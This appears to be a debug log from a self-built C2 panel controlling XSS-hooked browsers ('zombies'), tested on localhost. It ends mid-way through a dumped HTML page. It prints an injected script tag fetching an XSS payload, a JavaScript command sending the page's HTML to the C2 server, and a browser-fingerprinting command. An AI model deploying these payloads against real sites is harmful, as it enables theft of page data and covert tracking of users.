2025-06-26 22:46:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:21] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:21 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:21.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0089s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:21] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:26 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:26 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:26.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:26] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:26 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:26 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:26.141594
2025-06-26 22:46:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0064s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:46:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:26] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:31 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:31 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:31.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:31] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:31 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:31 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:31.145517
2025-06-26 22:46:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0122s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:46:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:31] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-26 22:46:35 | INFO     | control_route.py:213 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-26 22:46:35 | INFO     | control_route.py:231 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: var fingerprint = { screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(',') }; alert(JSON.stringify(fingerprint, null, 2));
2025-06-26 22:46:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0036s) -> 回傳: <Response 399 bytes [200 OK]>
2025-06-26 22:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:35] "POST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 314 bytes [200 OK]>
2025-06-26 22:46:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 314 bytes [200 OK]>
2025-06-26 22:46:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:41 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var fingerprint = { screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(',') }; alert(JSON.stringify(fingerprint, null, 2));","timestamp":"2025-06-26T14:46:36.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0072s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:41] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:46:43 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:46:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 1591 bytes [200 OK]>
2025-06-26 22:46:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:43] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:46:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:46:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:46:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:46:58 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:46:58 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:46:58 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:46:58 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:46:58 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:47:28 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:47:28 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:47:28 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 34288)
2025-06-26 22:47:28 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:47:28 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:47:28 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:47:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:47:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:47:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:47:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:47:28 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:47:28 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:47:28 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:47:28 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:47:28 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:47:58 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:47:58 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:47:58 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 34735)
2025-06-26 22:47:58 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:47:58 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:47:58 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:47:58 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 22:47:58 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 22:48:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:48:01 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:48:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0228s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:48:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:48:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:48:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:48:06 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:48:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:48:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:48:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:48:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:48:11 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:48:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:48:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:48:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:48:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:48:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:48:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:48:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:48:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:49:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:49:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:49:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:49:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:49:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:50:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:50:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:50:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:50:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:50:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:51:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:51:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:51:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:51:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:51:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:51:45 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:51:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:51:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:51:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:51:48 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:51:48 | ERROR    | control_route.py:90 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'flaresolverr.dashboard'. Did you mean 'flaresolverr.flaresolverr_dashboard' instead?
2025-06-26 22:51:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0121s) -> 回傳: (<Response 136 bytes [200 OK]>, 500)
2025-06-26 22:51:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:48] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-26 22:51:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:51:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:51:49 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:51:49 | ERROR    | control_route.py:90 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'flaresolverr.dashboard'. Did you mean 'flaresolverr.flaresolverr_dashboard' instead?
2025-06-26 22:51:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0022s) -> 回傳: (<Response 136 bytes [200 OK]>, 500)
2025-06-26 22:51:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:49] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-26 22:51:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:49] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:51:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:51:50 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:51:50 | ERROR    | control_route.py:90 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'flaresolverr.dashboard'. Did you mean 'flaresolverr.flaresolverr_dashboard' instead?
2025-06-26 22:51:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0030s) -> 回傳: (<Response 136 bytes [200 OK]>, 500)
2025-06-26 22:51:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:50] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-26 22:51:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:51:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:51:51 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:51:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:51:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:51:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:51:56 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:51:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:51:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:51:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:01 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:06 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:11 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:52:11 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:52:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0043s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" herf="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 